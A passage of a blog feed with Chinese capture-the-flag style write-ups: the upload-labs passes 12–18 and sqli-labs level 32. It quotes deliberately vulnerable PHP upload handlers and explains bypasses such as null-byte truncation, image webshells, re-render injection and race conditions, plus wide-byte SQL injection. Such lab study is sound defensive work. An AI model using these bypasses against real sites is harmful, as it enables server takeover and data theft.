class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307191536326.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307191537187.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们直接删除多余的，访问1.php</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307191538467.png"></p><h2 id="pass–13"><a href="#pass–13" class="headerlink" title="pass–13"></a>pass–13</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个和上一个比较，请求方式发生了变化成了post请求。但原理还是一样的</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以在php后面写写一个a 转成16进制就是61 在改成00就可以了。00是显示不出来的。</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307191548429.png"></p><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307191547010.png"></p><h2 id="pass–14"><a href="#pass–14" class="headerlink" title="pass–14"></a>pass–14</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第14关用到的是图片马，制作一个图片马先</span><br><span class="line">copy 123.jpg/b + 1.php/a  555.jpg   /b 表示二进制  /a 表示二进制马 然后重命名为555.jpg</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307191633133.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以看到这两个图片并没有差别</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307191636260.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用16进制查看可以看到我们写的php 一句话木马 </span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307191640250.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个上传会出现问题，应该是文件太大了。建议使用大小较小的图片</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307201845353.png"></p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">进行上传，配合文件包含漏洞查看图片木马是否成功，至于文件包含漏洞就是一个文件里面包含了多个文件。可以查看这个文件里面的文件</span><br><span class="line">可以看到file变量是可控的，我们利用这个变量传入我们图片地址的参数进行查看是否成功</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307201848367.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图片地址</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307201851994.png"></p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">进行传参查看图片</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307201853833.png"></p><h2 id="pass–15"><a href="#pass–15" class="headerlink" title="pass–15"></a>pass–15</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">和14关一样使用图片马即可。 getimagesize函数 会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pass–16"><a href="#pass–16" class="headerlink" title="pass–16"></a>pass–16</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">exif_imagetype() 读取一个图像的第一个字节并检查其签名。 也只是检查第一个字节。 做本关之前需要开启php exif 模块. 因为这个函数是这个模块内置的。</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307221756242.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">图片马上传，使用文件包含漏洞地址进行文件读取。</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307221759924.png"></p><h2 id="pass–17"><a href="#pass–17" class="headerlink" title="pass–17"></a>pass–17</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">图片二次渲染，简单说就是上传一张图片后他在渲染一次，相当于照着图片重新画了一次。对于二次渲染绕过使用gif格式比较简单，找第二次渲染没有改变的位置，建议第四行插入php木马。二次渲染函数：imagecreatefromjpeg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们可以用之前的方法把一句话木马加入到图片里面，再看渲染后的样子.</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">末尾的一句话木马已经没有了</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307231517499.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">蓝色部分就是二次渲染之后没有改变的值</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307231518106.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在第5行中插入木马</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307231519530.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">进行上传，使用文件包含漏洞访问图片，查看是否成功</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202307231521188.png"></p><h2 id="pass–18"><a href="#pass–18" class="headerlink" title="pass–18"></a>pass–18</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第18关用到的是条件竞争，根据源码是先上传后检测文件，再重命名。条件竞争原理就是我们只要一直上传超过他删除文件的速度，就可以绕过了。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$file_name</span>,<span class="title function_ invoke__">strrpos</span>(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             <span class="title function_ invoke__">rename</span>(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入---宽字节注入</title>
      <link href="/2023/06/28/sql%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/06/28/sql%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="前言-宽字节注入是为了绕过-php中的转义函数诞生的。实例靶场为sqli-labs-中的32关。"><a href="#前言-宽字节注入是为了绕过-php中的转义函数诞生的。实例靶场为sqli-labs-中的32关。" class="headerlink" title="前言: 宽字节注入是为了绕过 php中的转义函数诞生的。实例靶场为sqli-labs 中的32关。"></a>前言: 宽字节注入是为了绕过 php中的转义函数诞生的。实例靶场为sqli-labs 中的32关。</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>有时候为了防止用户的输入内容带有恶意指令，就对用户输入能容进行处理。addslashes() 函数对单双引号、反斜线及NULL加上反斜线转义,可以有效防止sql注入。但mysql 的编码为GBK, 会认为两个字节为一个汉字 我们只需要用字节把 \ 进行处理成一个汉字,再进行闭合就可以进行注入。而%df 和 &#x2F; (%5c) 会变为汉字運</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">当我们输入 1&#x27; 是可以发现 &#x27; 被转义成了 1\&#x27; 这样就无法闭合前面的单引号</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202306282130391.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们使用 %df 让他变为一个汉字 进行列的查询 可以发现数据有3列 当第4列是进行了报错</span><br></pre></td></tr></table></figure><p>  <img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202306282135556.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">接着可以使用 联合注入或者报错注入进行 表 和字段的查询</span><br></pre></td></tr></table></figure><p><img src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202306282140217.png"></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python--自动登录</title>
      <link href="/2023/06/21/python---%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/"/>
      <url>/2023/06/21/python---%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/</url>
      
